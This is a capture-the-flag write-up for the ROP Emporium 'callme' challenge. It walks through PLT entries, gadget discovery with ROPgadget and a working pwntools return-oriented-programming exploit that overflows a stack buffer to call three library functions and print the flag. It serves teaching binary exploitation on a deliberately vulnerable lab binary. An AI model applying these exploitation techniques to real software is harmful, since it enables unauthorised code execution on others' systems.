# callme

_call me maybe?_

This is where it gets interesting. Remember when I said to research the PLT last writeup? Yeah, this is why.

If you haven't already, read up on how it works. You can do so [here](https://ropemporium.com/guide.html#Appendix%20A), but there are tons of resources out there.

In this challenge, the author makes life easy for us and removes the need for any reversing by telling us the objective:

> You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

This means we need to control `rdi`, `rsi`, and `rdx`, as parameters to functions are passed in these registers.

Looking at the binary in Cutter, we see the same three functions:

```text
sym.main
sym.pwnme
sym.usefulFunction
```

We also see this:

```text
sym.imp.callme_one
sym.imp.callme_two
sym.imp.callme_three
```

Now, the functions we have to call are outside of the binary. They are located in `libcallme.so`, which was provided with the challenge. This means they are dynamically resolved at runtime as they are called.

Going back to the binary, we'll take a look at `usefulFunction`'s decompilation:

```c
void usefulFunction(void)
{
    callme_three(4, 5, 6);
    callme_two(4, 5, 6);
    callme_one(4, 5, 6);
    exit(1);
    return;
}
```

Well, that's not very useful. Looking at the disassembly only strengthens this:

```assembly
; addresses removed for brevity
; usefulFunction ();
push    rbp
mov     rbp, rsp
mov     edx, 6
mov     esi, 5
mov     edi, 4
call    callme_three ; sym.imp.callme_three
mov     edx, 6
mov     esi, 5
mov     edi, 4
call    callme_two ; sym.imp.callme_two
mov     edx, 6
mov     esi, 5
mov     edi, 4
call    callme_one ; sym.imp.callme_one
mov     edi, 1 ; int status
call    exit ; sym.imp.exit ; void exit(int status)
```

Not only are the functions called in the wrong order, they are also called with the wrong arguments. In fact, we can't change these arguments, because we don't control `edx`, `esi`, or `edi`. We could find a gadget somewhere and `ret` directly to the calls after popping the required values into our registers, but that would be a long and complicated ROP chain.

As it turns out, this function is only here to make sure that the functions get imported by the linker at compile time and their entries get placed in the PLT.

So, instead of jumping to this, we could just jump to their entries in the PLT.

Now, all we need to do is find a gadget that can pop `rdi`, `rsi`, and `rdx`. The order doesn't matter, as we can craft the buffer overflow to suit the gadget. We can use `ROPgadget` to find such a gadget like so:

```text
$ ROPgadget --binary ./callme | grep rdi
0x0000000000400a3d : add byte ptr [rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x0000000000400a3f : add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x0000000000400a3c : add byte ptr fs:[rax], al ; add byte ptr [rbp + rdi*8 - 1], ch ; call qword ptr [rax + 0x23000000]
0x000000000040093b : lcall [rdi + 0x5e] ; pop rdx ; ret
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
0x00000000004009a3 : pop rdi ; ret
```

Look at that second last result.

```text
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

Three birds with one stone. Perfect.

With this, we can construct our exploit:

```python
from pwn import *

context.arch = "amd64"

# doing this saves us from hardcoding a lot of stuff
elf = context.binary = ELF("./callme")

# case in point:
# we can just lookup the addresses of each function via the symbol table.
# no need to trawl through the PLT looking for them.
CALLMES = [
    p64(elf.symbols.callme_one),
    p64(elf.symbols.callme_two),
    p64(elf.symbols.callme_three),
]

# set the params we need to call the functions with
RDI = p64(0xdeadbeefdeadbeef)
RSI = p64(0xcafebabecafebabe)
RDX = p64(0xd00df00dd00df00d)

# still need to hardcode this though
# pop rdi; pop rsi; pop rdx; ret
GADGET = p64(0x40093c)

# overflow the buffer
payload = b'A' * 40

# since we add the exact same things in the exact same order for each call,
# just use a loop
for i in range(3):
    # first ret to the gadget
    payload += GADGET
    # the gadget will pop rdi
    payload += RDI
    # then pop rsi
    payload += RSI
    # then pop rdx
    payload += RDX
    # then ret to the function
    payload += CALLMES[i]

conn = process("./callme")

conn.recvuntil(b'> ')
conn.send(payload)
recved = conn.recvall()

# pretty print because we can
print(recved.decode("ascii"))
```

Great. We can run this now.

```text
$ python exploit.py

[*] '/home/sammy/Projects/binexp/ropemporium/3-callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process './callme': pid 186777
[+] Receiving all data: Done (104B)
[*] Process './callme' stopped with exit code 0 (pid 186777)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```

Boom.
